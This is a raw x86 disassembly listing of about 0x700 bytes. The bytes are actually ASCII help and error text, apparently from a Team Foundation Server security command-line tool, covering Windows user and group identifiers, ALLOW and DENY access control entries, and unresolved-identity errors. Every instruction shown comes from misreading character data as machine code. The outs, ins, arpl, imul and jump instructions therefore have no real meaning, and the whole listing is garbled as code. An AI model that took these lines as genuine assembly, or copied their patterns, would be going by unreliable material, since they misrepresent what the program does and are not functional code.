  4073cf:	and    BYTE PTR gs:[ecx+ebp*2+0x73],ah
  4073d4:	jo     0x407442
  4073d6:	popa   
  4073d7:	jns    0x40744c
  4073d9:	and    BYTE PTR [ecx+0x64],ch
  4073dc:	outs   dx,BYTE PTR gs:[esi]
  4073de:	je     0x407449
  4073e0:	je     0x40745b
  4073e2:	and    BYTE PTR [ecx+0x6e],ch
  4073e5:	outs   dx,WORD PTR ds:[esi]
  4073e7:	jb     0x407456
  4073e9:	popa   
  4073ea:	je     0x407455
  4073ec:	outs   dx,DWORD PTR ds:[esi]
  4073ed:	outs   dx,BYTE PTR ds:[esi]
  4073ee:	and    BYTE PTR [esi+0x6f],ah
  4073f1:	jb     0x407413
  4073f3:	je     0x40745d
  4073f5:	and    BYTE PTR gs:[eax+0x72],dl
  4073f9:	outs   dx,DWORD PTR ds:[esi]
  4073fa:	push   0x65
  4073fc:	arpl   WORD PTR [eax+eiz*1+0x43],si
  407400:	outs   dx,DWORD PTR ds:[esi]
  407401:	ins    BYTE PTR es:[edi],dx
  407402:	ins    BYTE PTR es:[edi],dx
  407403:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407408:	outs   dx,BYTE PTR ds:[esi]
  407409:	and    BYTE PTR [ecx+0x64],al
  40740c:	ins    DWORD PTR es:[edi],dx
  40740d:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  407414:	je     0x407485
  407416:	jb     0x40748b
  407418:	and    BYTE PTR [edi+0x72],ah
  40741b:	outs   dx,DWORD PTR ds:[esi]
  40741c:	jne    0x40748e
  40741e:	and    BYTE PTR [ecx+0x6e],ch
  407421:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407425:	and    BYTE PTR [edx],ah
  407427:	inc    esp
  407428:	popa   
  407429:	je     0x4074a0
  40742b:	ins    DWORD PTR es:[edi],dx
  40742c:	dec    edi
  40742d:	outs   dx,BYTE PTR ds:[esi]
  40742e:	and    ah,BYTE PTR gs:[eax]
  407431:	je     0x407498
  407433:	popa   
  407434:	ins    DWORD PTR es:[edi],dx
  407435:	and    BYTE PTR [eax+0x72],dh
  407438:	outs   dx,DWORD PTR ds:[esi]
  407439:	push   0x65
  40743b:	arpl   WORD PTR [eax+eiz*1+0x63],si
  40743f:	outs   dx,DWORD PTR ds:[esi]
  407440:	ins    BYTE PTR es:[edi],dx
  407441:	ins    BYTE PTR es:[edi],dx
  407442:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407447:	outs   dx,BYTE PTR ds:[esi]
  407448:	and    BYTE PTR [ecx+0x6e],ch
  40744b:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40744f:	and    BYTE PTR [edi+ebp*2+0x6d],ah
  407453:	popa   
  407454:	imul   ebp,DWORD PTR [esi+0x20],0x74614422
  40745b:	jne    0x4074ca
  40745d:	xor    DWORD PTR [edx],esp
  40745f:	and    BYTE PTR [ecx+0x74],ah
  407462:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407466:	and    BYTE PTR [esi+0x69],ah
  407469:	arpl   WORD PTR [ecx+ebp*2+0x74],si
  40746d:	imul   ebp,DWORD PTR [edi+0x75],0x6f632073
  407474:	ins    DWORD PTR es:[edi],dx
  407475:	jo     0x4074d8
  407477:	outs   dx,BYTE PTR ds:[esi]
  407478:	jns    0x40749a
  40747a:	and    al,BYTE PTR [ecx+0x2e]
  40747d:	and    BYTE PTR [ecx+eiz*2+0x74],al
  407481:	jne    0x4074f0
  407483:	and    BYTE PTR [ebx+0x6f],al
  407486:	jb     0x4074f8
  407488:	outs   dx,DWORD PTR ds:[esi]
  407489:	jb     0x4074ec
  40748b:	je     0x4074f6
  40748d:	outs   dx,DWORD PTR ds:[esi]
  40748e:	outs   dx,BYTE PTR ds:[esi]
  40748f:	and    ah,BYTE PTR [eax]
  407491:	jne    0x407506
  407493:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  40749a:	and    BYTE PTR [ecx+0x64],ah
  40749d:	ins    DWORD PTR es:[edi],dx
  40749e:	cmp    ah,BYTE PTR [eax]
  4074a0:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x79746974
  4074a8:	and    BYTE PTR [ebx+0x70],dh
  4074ab:	arpl   WORD PTR gs:[ecx+0x66],bp
  4074af:	imul   esp,DWORD PTR [ebp+0x72],0x3e0a0d3a
  4074b6:	je     0x40751e
  4074b8:	jae    0x40752d
  4074ba:	arpl   WORD PTR gs:[ebp+0x72],si
  4074be:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x786d692f
  4074c6:	and    BYTE PTR [ecx+0x64],ah
  4074c9:	ins    DWORD PTR es:[edi],dx
  4074ca:	cmp    ah,BYTE PTR [eax]
  4074cc:	das    
  4074cd:	arpl   WORD PTR [edi+0x6c],bp
  4074d0:	ins    BYTE PTR es:[edi],dx
  4074d1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4074d6:	outs   dx,BYTE PTR ds:[esi]
  4074d7:	cmp    ch,BYTE PTR [eax+0x74]
  4074da:	je     0x40754c
  4074dc:	cmp    ch,BYTE PTR [edi]
  4074de:	das    
  4074df:	inc    ecx
  4074e0:	inc    esp
  4074e1:	popa   
  4074e2:	je     0x407559
  4074e4:	ins    DWORD PTR es:[edi],dx
  4074e5:	inc    ebx
  4074e6:	outs   dx,DWORD PTR ds:[esi]
  4074e7:	jb     0x407559
  4074e9:	outs   dx,DWORD PTR ds:[esi]
  4074ea:	jb     0x40754d
  4074ec:	je     0x407557
  4074ee:	outs   dx,DWORD PTR ds:[esi]
  4074ef:	outs   dx,BYTE PTR ds:[esi]
  4074f0:	cmp    bh,BYTE PTR [eax]
  4074f2:	xor    BYTE PTR [eax],bh
  4074f4:	xor    BYTE PTR [edi],ch
  4074f6:	inc    esp
  4074f7:	popa   
  4074f8:	je     0x40756f
  4074fa:	ins    DWORD PTR es:[edi],dx
  4074fb:	dec    edi
  4074fc:	outs   dx,BYTE PTR ds:[esi]
  4074fd:	add    DWORD PTR gs:[eax+0x70795405],ecx
  407504:	and    BYTE PTR gs:[ebp+0x61],cl
  407508:	jb     0x407575
  40750a:	gs jb  0x407580
  40750d:	cmp    cl,BYTE PTR ds:0x200a0d0a
  407513:	and    BYTE PTR [eax],ah
  407515:	and    BYTE PTR [eax+ebp*2+0x65],dl
  407519:	and    BYTE PTR [esi+0x6f],ah
  40751c:	ins    BYTE PTR es:[edi],dx
  40751d:	ins    BYTE PTR es:[edi],dx
  40751e:	outs   dx,DWORD PTR ds:[esi]
  40751f:	ja     0x40758a
  407521:	outs   dx,BYTE PTR ds:[esi]
  407522:	and    BYTE PTR [bx+di+0x64],ch
  407526:	outs   dx,BYTE PTR gs:[esi]
  407528:	je     0x407593
  40752a:	je     0x4075a5
  40752c:	and    BYTE PTR [ecx+edi*2+0x70],dh
  407530:	and    BYTE PTR gs:[ebp+0x61],ch
  407534:	jb     0x4075a1
  407536:	gs jb  0x4075ac
  407539:	and    BYTE PTR [ecx+0x72],ah
  40753c:	and    BYTE PTR gs:[ebp+0x73],dh
  407540:	gs and BYTE PTR fs:[ecx+0x6e],ch
  407545:	and    BYTE PTR [edi+0x75],ch
  407548:	je     0x4075ba
  40754a:	jne    0x4075c0
  40754c:	and    BYTE PTR [ebp+0x65],ch
  40754f:	jae    0x4075c4
  407551:	popa   
  407552:	addr16 gs jae 0x407590
  407556:	or     eax,0x200a0d0a
  40755b:	and    BYTE PTR [eax],ah
  40755d:	and    BYTE PTR [eax],ah
  40755f:	and    BYTE PTR [eax],ah
  407561:	and    BYTE PTR [ebx+0x55],bl
  407564:	pop    ebp
  407565:	and    BYTE PTR ds:0x6e695720,ch
  40756b:	outs   dx,DWORD PTR fs:[esi]
  40756d:	ja     0x4075e2
  40756f:	and    BYTE PTR [ebp+0x73],dh
  407572:	gs jb  0x407582
  407575:	or     ah,BYTE PTR [eax]
  407577:	and    BYTE PTR [eax],ah
  407579:	and    BYTE PTR [eax],ah
  40757b:	and    BYTE PTR [eax],ah
  40757d:	and    BYTE PTR [ebx+0x47],bl
  407580:	pop    ebp
  407581:	and    BYTE PTR ds:0x6e695720,ch
  407587:	outs   dx,DWORD PTR fs:[esi]
  407589:	ja     0x4075fe
  40758b:	and    BYTE PTR [edi+0x72],ah
  40758e:	outs   dx,DWORD PTR ds:[esi]
  40758f:	jne    0x407601
  407591:	or     eax,0x2020200a
  407596:	and    BYTE PTR [eax],ah
  407598:	and    BYTE PTR [eax],ah
  40759a:	and    BYTE PTR [ebx+0x41],bl
  40759d:	pop    ebp
  40759e:	and    BYTE PTR ds:0x67204120,ch
  4075a4:	jb     0x407615
  4075a6:	jne    0x407618
  4075a8:	and    BYTE PTR [ebx+0x70],dh
  4075ab:	arpl   WORD PTR gs:[ecx+0x66],bp
  4075af:	imul   esp,DWORD PTR [ebx+0x20],0x54206f74
  4075b6:	gs popa 
  4075b8:	ins    DWORD PTR es:[edi],dx
  4075b9:	and    BYTE PTR [esi+0x6f],al
  4075bc:	jne    0x40762c
  4075be:	fs popa 
  4075c0:	je     0x40762b
  4075c2:	outs   dx,DWORD PTR ds:[esi]
  4075c3:	outs   dx,BYTE PTR ds:[esi]
  4075c4:	and    BYTE PTR [ebx+0x65],dl
  4075c7:	jb     0x40763f
  4075c9:	gs jb  0x4075f8
  4075cc:	and    BYTE PTR [ebx+0x75],dh
  4075cf:	arpl   WORD PTR [eax+0x20],bp
  4075d2:	popa   
  4075d3:	jae    0x4075f5
  4075d5:	loop   0x407557
  4075d7:	pushf  
  4075d8:	push   eax
  4075d9:	jb     0x40764a
  4075db:	push   0x65
  4075dd:	arpl   WORD PTR [eax+eiz*1+0x41],si
  4075e1:	fs ins DWORD PTR es:[edi],dx
  4075e3:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  4075ea:	je     0x40765b
  4075ec:	jb     0x407661
  4075ee:	loop   0x407570
  4075f0:	popf   
  4075f1:	or     eax,0x200a0d0a
  4075f6:	and    BYTE PTR [eax],ah
  4075f8:	and    BYTE PTR [eax],ah
  4075fa:	and    BYTE PTR [ecx+0x20],ah
  4075fd:	pop    ebx
  4075fe:	inc    ecx
  4075ff:	pop    ebp
  407600:	and    BYTE PTR ds:0x6d644120,ch
  407606:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40760d:	je     0x407678
  40760f:	jbe    0x407676
  407611:	and    BYTE PTR [edi+0x72],ah
  407614:	outs   dx,DWORD PTR ds:[esi]
  407615:	jne    0x407687
  407617:	or     eax,0x2020200a
  40761c:	and    BYTE PTR [eax],ah
  40761e:	and    BYTE PTR [ebp+0x20],ah
  407621:	pop    ebx
  407622:	inc    ecx
  407623:	pop    ebp
  407624:	and    BYTE PTR ds:0x65764520,ch
  40762a:	jb     0x4076a5
  40762c:	outs   dx,DWORD PTR ds:[esi]
  40762d:	outs   dx,BYTE PTR ds:[esi]
  40762e:	and    BYTE PTR gs:[edi+0x72],ah
  407632:	outs   dx,DWORD PTR ds:[esi]
  407633:	jne    0x4076a5
  407635:	or     eax,0x2020200a
  40763a:	and    BYTE PTR [eax],ah
  40763c:	and    BYTE PTR [ebx+0x20],dh
  40763f:	pop    ebx
  407640:	inc    ecx
  407641:	pop    ebp
  407642:	and    BYTE PTR ds:0x72655320,ch
  407648:	jbe    0x4076b3
  40764a:	arpl   WORD PTR [ebp+0x20],sp
  40764d:	popa   
  40764e:	arpl   WORD PTR [ebx+0x6f],sp
  407651:	jne    0x4076c1
  407653:	je     0x407675
  407655:	addr16 jb 0x4076c7
  407658:	jne    0x4076ca
  40765a:	or     eax,0x200a0d0a
  40765f:	and    BYTE PTR [eax],ah
  407661:	and    BYTE PTR [eax],ah
  407663:	and    BYTE PTR [eax],ah
  407665:	and    BYTE PTR [ebx+0x58],bl
  407668:	pop    ebp
  407669:	and    BYTE PTR ds:0x65685420,ch
  40766f:	and    BYTE PTR [ecx+0x64],ch
  407672:	outs   dx,BYTE PTR gs:[esi]
  407674:	je     0x4076df
  407676:	je     0x4076f1
  407678:	and    BYTE PTR [ecx+0x73],ch
  40767b:	and    BYTE PTR [esi+0x6f],ch
  40767e:	je     0x4076a0
  407680:	jbe    0x4076e3
  407682:	ins    BYTE PTR es:[edi],dx
  407683:	imul   esp,DWORD PTR [esi+ebp*1+0xd],0x2020200a
  40768b:	and    BYTE PTR [eax],ah
  40768d:	and    BYTE PTR [eax],ah
  40768f:	and    BYTE PTR [ebx+0x3f],bl
  407692:	pop    ebp
  407693:	and    BYTE PTR ds:0x65685420,ch
  407699:	and    BYTE PTR [ecx+0x64],ch
  40769c:	outs   dx,BYTE PTR gs:[esi]
  40769e:	je     0x407709
  4076a0:	je     0x40771b
  4076a2:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4076a6:	and    BYTE PTR gs:[ecx+0x73],ch
  4076aa:	and    BYTE PTR [esi+0x6f],ch
  4076ad:	je     0x4076cf
  4076af:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4076b3:	outs   dx,BYTE PTR ds:[esi]
  4076b4:	cs or  eax,0x200a0d0a
  4076ba:	and    BYTE PTR [eax],ah
  4076bc:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4076c0:	and    BYTE PTR [esi+0x6f],ah
  4076c3:	ins    BYTE PTR es:[edi],dx
  4076c4:	ins    BYTE PTR es:[edi],dx
  4076c5:	outs   dx,DWORD PTR ds:[esi]
  4076c6:	ja     0x407731
  4076c8:	outs   dx,BYTE PTR ds:[esi]
  4076c9:	and    BYTE PTR [bx+di+0x63],ah
  4076cd:	arpl   WORD PTR [ebp+0x73],sp
  4076d0:	jae    0x4076f2
  4076d2:	arpl   WORD PTR [edi+0x6e],bp
  4076d5:	je     0x407749
  4076d7:	outs   dx,DWORD PTR ds:[esi]
  4076d8:	ins    BYTE PTR es:[edi],dx
  4076d9:	and    BYTE PTR [ebp+0x6e],ah
  4076dc:	je     0x407750
  4076de:	jns    0x407700
  4076e0:	ins    DWORD PTR es:[edi],dx
  4076e1:	popa   
  4076e2:	jb     0x40774f
  4076e4:	gs jb  0x40775a
  4076e7:	and    BYTE PTR [ecx+0x72],ah
  4076ea:	and    BYTE PTR gs:[ebp+0x73],dh
  4076ee:	gs and BYTE PTR fs:[ecx+0x6e],ch
  4076f3:	and    BYTE PTR [edi+0x75],ch
  4076f6:	je     0x407768
  4076f8:	jne    0x40776e
  4076fa:	and    BYTE PTR [ebp+0x65],ch
  4076fd:	jae    0x407772
  4076ff:	popa   
  407700:	addr16 gs jae 0x40773e
  407704:	or     eax,0x200a0d0a
  407709:	and    BYTE PTR [eax],ah
  40770b:	and    BYTE PTR [eax],ah
  40770d:	and    BYTE PTR [eax],ah
  40770f:	and    BYTE PTR [ebx+0x2b],bl
  407712:	pop    ebp
  407713:	and    BYTE PTR ds:0x4c4c4120,ch
  407719:	dec    edi
  40771a:	push   edi
  40771b:	and    BYTE PTR [ecx+0x63],ah
  40771e:	arpl   WORD PTR [ebp+0x73],sp
  407721:	jae    0x407743
  407723:	arpl   WORD PTR [edi+0x6e],bp
  407726:	je     0x40779a
  407728:	outs   dx,DWORD PTR ds:[esi]
  407729:	ins    BYTE PTR es:[edi],dx
  40772a:	and    BYTE PTR [ebp+0x6e],ah
  40772d:	je     0x4077a1
  40772f:	jns    0x40773e
  407731:	or     ah,BYTE PTR [eax]
  407733:	and    BYTE PTR [eax],ah
  407735:	and    BYTE PTR [eax],ah
  407737:	and    BYTE PTR [eax],ah
  407739:	and    BYTE PTR [ebx+0x2d],bl
  40773c:	pop    ebp
  40773d:	and    BYTE PTR ds:0x4e454420,ch
  407743:	pop    ecx
  407744:	and    BYTE PTR [ecx+0x63],ah
  407747:	arpl   WORD PTR [ebp+0x73],sp
  40774a:	jae    0x40776c
  40774c:	arpl   WORD PTR [edi+0x6e],bp
  40774f:	je     0x4077c3
  407751:	outs   dx,DWORD PTR ds:[esi]
  407752:	ins    BYTE PTR es:[edi],dx
  407753:	and    BYTE PTR [ebp+0x6e],ah
  407756:	je     0x4077ca
  407758:	jns    0x407767
  40775a:	or     cl,BYTE PTR ds:0x2020200a
  407760:	and    BYTE PTR [eax],ah
  407762:	and    BYTE PTR [edx],ch
  407764:	and    BYTE PTR [ebx+0x20],bl
  407767:	pop    ebp
  407768:	and    BYTE PTR ds:0x686e4920,ch
  40776e:	gs jb  0x4077da
  407771:	je     0x4077d8
  407773:	and    BYTE PTR fs:[ecx+0x63],ah
  407777:	arpl   WORD PTR [ebp+0x73],sp
  40777a:	jae    0x40779c
  40777c:	arpl   WORD PTR [edi+0x6e],bp
  40777f:	je     0x4077f3
  407781:	outs   dx,DWORD PTR ds:[esi]
  407782:	ins    BYTE PTR es:[edi],dx
  407783:	and    BYTE PTR [ebp+0x6e],ah
  407786:	je     0x4077fa
  407788:	jns    0x40778b
  40778a:	and    BYTE PTR [eax+ebp*2+0x65],dl
  40778e:	and    BYTE PTR [ecx+0x64],ch
  407791:	outs   dx,BYTE PTR gs:[esi]
  407793:	je     0x4077fe
  407795:	je     0x407810
  407797:	and    BYTE PTR [ebx+0x61],ah
  40779a:	outs   dx,BYTE PTR ds:[esi]
  40779b:	outs   dx,BYTE PTR ds:[esi]
  40779c:	outs   dx,DWORD PTR ds:[esi]
  40779d:	je     0x4077bf
  40779f:	bound  esp,QWORD PTR [ebp+0x20]
  4077a2:	jb     0x407809
  4077a4:	jae    0x407815
  4077a6:	ins    BYTE PTR es:[edi],dx
  4077a7:	jbe    0x40780e
  4077a9:	fs add DWORD PTR cs:[edi],ecx
  4077ad:	dec    ecx
  4077ae:	fs outs dx,BYTE PTR gs:[esi]
  4077b1:	je     0x40781c
  4077b3:	je     0x40782e
  4077b5:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4077b9:	cmp    ah,BYTE PTR gs:[eax]
  4077bc:	add    DWORD PTR [edx],esp
  4077be:	dec    ecx
  4077bf:	outs   dx,BYTE PTR ds:[esi]
  4077c0:	jae    0x407837
  4077c2:	data16 imul sp,WORD PTR [ebx+0x69],0x6e65
  4077c9:	je     0x4077eb
  4077cb:	outs   dx,BYTE PTR ds:[esi]
  4077cc:	jne    0x40783b
  4077ce:	bound  esp,QWORD PTR [ebp+0x72]
  4077d1:	and    BYTE PTR [edi+0x66],ch
  4077d4:	and    BYTE PTR [eax+0x61],dh
  4077d7:	jb     0x40783a
  4077d9:	ins    DWORD PTR es:[edi],dx
  4077da:	gs je  0x407842
  4077dd:	jb     0x407852
  4077df:	add    DWORD PTR cs:[edx*2+0x6365726e],ecx
  4077e7:	outs   dx,DWORD PTR ds:[esi]
  4077e8:	outs   dx,BYTE PTR ds:[si]
  4077ea:	imul   edi,DWORD PTR [edx+0x65],0x542e0164
  4077f1:	push   0x63612065
  4077f6:	arpl   WORD PTR [ebp+0x73],sp
  4077f9:	jae    0x40781b
  4077fb:	arpl   WORD PTR [edi+0x6e],bp
  4077fe:	je     0x407872
  407800:	outs   dx,DWORD PTR ds:[esi]
  407801:	ins    BYTE PTR es:[edi],dx
  407802:	and    BYTE PTR [ebp+0x6e],ah
  407805:	je     0x407879
  407807:	jns    0x407829
  407809:	je     0x407884
  40780b:	jo     0x407872
  40780d:	and    BYTE PTR [ecx+0x73],ch
  407810:	and    BYTE PTR [ecx+0x6e],ch
  407813:	jbe    0x407876
  407815:	ins    BYTE PTR es:[edi],dx
  407816:	imul   esp,DWORD PTR [edx+edi*1+0x20],0x2e7d307b
  40781e:	add    DWORD PTR [ecx],edi
  407820:	push   esp
  407821:	push   0x63612065
  407826:	je     0x407891
  407828:	outs   dx,DWORD PTR ds:[esi]
  407829:	outs   dx,BYTE PTR ds:[esi]
  40782a:	and    BYTE PTR [ebx+0x30],bh
  40782d:	jge    0x40784f
  40782f:	imul   esi,DWORD PTR [ebx+0x20],0x61766e69
  407836:	ins    BYTE PTR es:[edi],dx
  407837:	imul   esp,DWORD PTR [eax+eiz*1+0x66],0x7420726f
  40783f:	push   0x65732065
  407844:	arpl   WORD PTR [ebp+0x72],si
  407847:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x656d616e
  40784f:	jae    0x4078c1
  407851:	popa   
  407852:	arpl   WORD PTR [ebp+0x20],sp
  407855:	jnp    0x407888
  407857:	jge    0x407887
  407859:	add    DWORD PTR [edx],esi
  40785b:	push   ebp
  40785c:	outs   dx,BYTE PTR ds:[esi]
  40785d:	jb     0x4078c4
  40785f:	arpl   WORD PTR [edi+0x67],bp
  407862:	outs   dx,BYTE PTR ds:[esi]
  407863:	imul   edi,DWORD PTR [edx+0x65],0x6f632064
  40786a:	ins    DWORD PTR es:[edi],dx
  40786b:	ins    DWORD PTR es:[edi],dx
  40786c:	popa   
  40786d:	outs   dx,BYTE PTR ds:[esi]
  40786e:	fs sub eax,0x656e696c
  407874:	and    BYTE PTR [ebx+0x77],dh
  407877:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x20736920
  40787f:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  407886:	cmp    ah,BYTE PTR [eax]
  407888:	das    
  407889:	jnp    0x4078bb
  40788b:	jge    0x4078bb
  40788d:	add    DWORD PTR [edi],ebx
  40788f:	inc    ebp
  407890:	jb     0x407904
  407892:	outs   dx,DWORD PTR ds:[esi]
  407893:	jb     0x4078cf
  407895:	and    BYTE PTR [eax+0x6c],dl
  407898:	gs popa 
  40789a:	jae    0x407901
  40789c:	and    BYTE PTR [ebx+0x70],dh
  40789f:	arpl   WORD PTR gs:[ecx+0x66],bp
  4078a3:	jns    0x4078c5
  4078a5:	popa   
  4078a6:	and    BYTE PTR [ebx+0x65],dh
  4078a9:	jb     0x407921
  4078ab:	gs jb  0x4078dc
  4078ae:	add    DWORD PTR [esi],esp
  4078b0:	push   esp
  4078b1:	push   0x65722065
  4078b6:	je     0x40792d
  4078b8:	jb     0x407928
  4078ba:	gs and BYTE PTR fs:[ecx+0x64],ch
  4078bf:	outs   dx,BYTE PTR gs:[esi]
  4078c1:	je     0x40792c
  4078c3:	je     0x40793e
  4078c5:	and    BYTE PTR [ecx+0x73],ch
  4078c8:	and    BYTE PTR [ebp+0x6e],dh
  4078cb:	jb     0x407932
  4078cd:	arpl   WORD PTR [edi+0x67],bp
  4078d0:	outs   dx,BYTE PTR ds:[esi]
  4078d1:	imul   edi,DWORD PTR [edx+0x65],0x37012e64
  4078d8:	dec    ecx
  4078d9:	outs   dx,BYTE PTR ds:[si]
  4078db:	outs   dx,DWORD PTR ds:[esi]
  4078dc:	jb     0x407947
  4078de:	outs   dx,BYTE PTR ds:[esi]
  4078df:	and    BYTE PTR [di+0x6e],dh
  4078e3:	jb     0x40794a
  4078e5:	arpl   WORD PTR [edi+0x67],bp
  4078e8:	outs   dx,BYTE PTR ds:[esi]
  4078e9:	imul   edi,DWORD PTR [edx+0x65],0x46542064
  4078f0:	push   ebx
  4078f1:	push   ebx
  4078f2:	inc    ebp
  4078f3:	inc    ebx
  4078f4:	push   ebp
  4078f5:	push   edx
  4078f6:	dec    ecx
  4078f7:	push   esp
  4078f8:	pop    ecx
  4078f9:	pop    edi
  4078fa:	push   ebx
  4078fb:	push   edi
  4078fc:	dec    ecx
  4078fd:	push   esp
  4078fe:	inc    ebx
  4078ff:	dec    eax
  407900:	inc    ebp
  407901:	push   ebx
  407902:	and    BYTE PTR [ebx+0x77],dh
  407905:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x307b203a
  40790d:	jge    0x40793d
  40790f:	add    DWORD PTR [eax+eiz*1],eax
  407912:	dec    ecx
  407913:	push   ebx
  407914:	and    BYTE PTR [ecx],al
  407916:	or     BYTE PTR [eax],ah
  407918:	dec    ecx
  407919:	push   ebx
  40791a:	and    BYTE PTR [esi+0x4f],cl
  40791d:	push   esp
  40791e:	and    BYTE PTR [ecx],al
  407920:	scas   al,BYTE PTR es:[edi]
  407921:	add    dl,BYTE PTR [eax+ebp*2+0x65]
  407925:	and    BYTE PTR [ebp+0x78],ah
  407928:	popa   
  407929:	ins    DWORD PTR es:[edi],dx
  40792a:	jo     0x407998
  40792c:	and    BYTE PTR gs:[ebx+0x6f],ah
  407930:	ins    DWORD PTR es:[edi],dx
  407931:	jo     0x407994
  407933:	outs   dx,BYTE PTR ds:[esi]
  407934:	imul   esp,DWORD PTR [ebp+0x73],0x726f202c
  40793b:	addr16 popa 
  40793d:	outs   dx,BYTE PTR ds:[esi]
  40793e:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  407945:	jae    0x407973
  407947:	and    BYTE PTR [eax+0x72],dh
  40794a:	outs   dx,DWORD PTR ds:[esi]
  40794b:	fs jne 0x4079b1
  40794e:	je     0x4079c3
  407950:	sub    al,0x20
  407952:	outs   dx,DWORD PTR fs:[esi]
  407954:	ins    DWORD PTR es:[edi],dx
  407955:	popa   
  407956:	imul   ebp,DWORD PTR [esi+0x20],0x656d616e
  40795d:	jae    0x40798b
  40795f:	and    BYTE PTR [ebp+0x2d],ah
  407962:	ins    DWORD PTR es:[edi],dx
  407963:	popa   
  407964:	imul   ebp,DWORD PTR [eax+eiz*1+0x61],0x65726464
  40796c:	jae    0x4079e1
  40796e:	gs jae 0x40799d
  407971:	and    BYTE PTR [edi+ebp*2+0x67],ch
  407975:	outs   dx,DWORD PTR ds:[esi]
  407976:	jae    0x4079a4
  407978:	and    BYTE PTR [eax+0x65],dh
  40797b:	outs   dx,DWORD PTR ds:[esi]
  40797c:	jo     0x4079ea
  40797e:	gs sub al,0x20
  407981:	jo     0x4079ef
  407983:	popa   
  407984:	arpl   WORD PTR [ebp+0x73],sp
  407987:	sub    al,0x20
  407989:	popa   
  40798a:	outs   dx,BYTE PTR ds:[esi]
  40798b:	and    BYTE PTR fs:[ebp+0x76],ah
  40798f:	outs   dx,BYTE PTR gs:[esi]
  407991:	je     0x407a06
  407993:	and    BYTE PTR [ebp+eiz*2+0x70],ah
  407997:	imul   esp,DWORD PTR [ebx+0x74],0x68206465
  40799e:	gs jb  0x407a06
  4079a1:	imul   ebp,DWORD PTR [esi+0x20],0x20657261
  4079a8:	imul   sp,WORD PTR [ebx+0x74],0x7469
  4079ae:	imul   ebp,DWORD PTR [edi+0x75],0x20202e73
  4079b5:	dec    esi
  4079b6:	outs   dx,DWORD PTR ds:[esi]
  4079b7:	and    BYTE PTR [ecx+0x73],ah
  4079ba:	jae    0x407a2b
  4079bc:	arpl   WORD PTR [ecx+0x61],bp
  4079bf:	je     0x407a2a
  4079c1:	outs   dx,DWORD PTR ds:[esi]
  4079c2:	outs   dx,BYTE PTR ds:[esi]
  4079c3:	and    BYTE PTR [edi+0x69],dh
  4079c6:	je     0x407a30
  4079c8:	and    BYTE PTR [ecx+0x6e],ah
  4079cb:	jns    0x4079ed
  4079cd:	jb     0x407a34
  4079cf:	popa   
  4079d0:	ins    BYTE PTR es:[edi],dx
  4079d1:	and    BYTE PTR [ebx+0x6f],ah
  4079d4:	ins    DWORD PTR es:[edi],dx
  4079d5:	jo     0x407a38
  4079d7:	outs   dx,BYTE PTR ds:[esi]
  4079d8:	jns    0x407a06
  4079da:	and    BYTE PTR [edi+0x72],ch
  4079dd:	addr16 popa 
  4079df:	outs   dx,BYTE PTR ds:[esi]
  4079e0:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4079e7:	sub    al,0x20
  4079e9:	jo     0x407a5d
  4079eb:	outs   dx,DWORD PTR ds:[esi]
  4079ec:	fs jne 0x407a52
  4079ef:	je     0x407a1d
  4079f1:	and    BYTE PTR [edi+ebp*2+0x6d],ah
  4079f5:	popa   
  4079f6:	imul   ebp,DWORD PTR [esi+0x20],0x656d616e
  4079fd:	sub    al,0x20
  4079ff:	gs ins DWORD PTR es:[edi],dx
  407a01:	popa   
  407a02:	imul   ebp,DWORD PTR [eax+eiz*1+0x61],0x65726464
  407a0a:	jae    0x407a7f
  407a0c:	sub    al,0x20
  407a0e:	ins    BYTE PTR es:[edi],dx
  407a0f:	outs   dx,DWORD PTR ds:[esi]
  407a10:	outs   dx,DWORD PTR ds:[si]
  407a12:	sub    al,0x20
  407a14:	jo     0x407a7b
  407a16:	jb     0x407a8b
  407a18:	outs   dx,DWORD PTR ds:[esi]
  407a19:	outs   dx,BYTE PTR ds:[esi]
  407a1a:	sub    al,0x20
  407a1c:	jo     0x407a8a
  407a1e:	popa   
  407a1f:	arpl   WORD PTR [ebp+0x73],sp
  407a22:	sub    al,0x20
  407a24:	outs   dx,DWORD PTR ds:[esi]
  407a25:	jb     0x407a47
  407a27:	gs jbe 0x407a8f
  407a2a:	outs   dx,BYTE PTR ds:[esi]
  407a2b:	je     0x407aa0
  407a2d:	and    BYTE PTR [ecx+0x73],ch
  407a30:	and    BYTE PTR [ecx+0x6e],ch
  407a33:	je     0x407a9a
  407a35:	outs   dx,BYTE PTR ds:[esi]
  407a36:	fs gs and BYTE PTR fs:[edi+0x72],ch
  407a3c:	and    BYTE PTR [ebx+0x68],dh
  407a3f:	outs   dx,DWORD PTR ds:[esi]
  407a40:	jne    0x407aae
  407a42:	and    BYTE PTR fs:[edx+0x65],ah
  407a46:	and    BYTE PTR [ecx+0x6e],ch
  407a49:	data16 gs jb 0x407abf
  407a4d:	gs fs add DWORD PTR cs:[edi],ecx
  407a52:	and    BYTE PTR [eax],ah
  407a54:	and    BYTE PTR [edi+ebp*2+0x67],cl
  407a58:	outs   dx,DWORD PTR ds:[esi]
  407a59:	outs   dx,BYTE PTR ds:[esi]
  407a5a:	and    BYTE PTR [esi+0x61],ch
  407a5d:	ins    DWORD PTR es:[edi],dx
  407a5e:	cmp    ah,BYTE PTR gs:[eax]
  407a61:	add    DWORD PTR [edi],ecx
  407a63:	and    BYTE PTR [ebp+0x61],cl
  407a66:	imul   ebp,DWORD PTR [eax+eiz*1+0x61],0x65726464
